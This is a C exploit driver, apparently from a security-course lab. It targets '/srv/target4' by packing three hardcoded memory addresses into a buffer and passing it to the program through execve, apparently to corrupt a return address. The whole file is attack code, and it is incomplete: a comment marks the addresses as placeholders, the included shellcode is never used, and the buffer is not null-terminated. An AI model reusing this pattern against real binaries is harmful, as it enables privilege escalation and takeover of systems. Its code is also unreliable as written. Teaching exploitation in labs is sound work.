#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[24];
  printf("Buffer created\n");

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  // Replace these with the correct offsets and addresses
  *addr_ptr++ = 0xffffe420;
  *addr_ptr++ = 0xffffcff0;
  *addr_ptr++ = 0xffffcfe8;
  printf("Buffer populated with addresses\n");

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  printf("Calling execve with target: %s\n", TARGET);
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}